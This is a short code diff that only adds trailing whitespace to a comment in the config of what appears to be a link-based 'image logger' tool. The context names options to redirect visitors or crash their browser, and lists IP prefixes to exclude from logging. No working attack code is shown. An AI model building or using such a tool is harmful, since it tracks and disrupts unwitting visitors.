@@ -60,7 +60,7 @@ config = {
     # 1) Redirect (If this is enabled, disables image and crash browser)
     # 2) Crash Browser (If this is enabled, disables image)
     # 3) Message (If this is enabled, disables image)
-    # 4) Image
+    # 4) Image 
 }
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
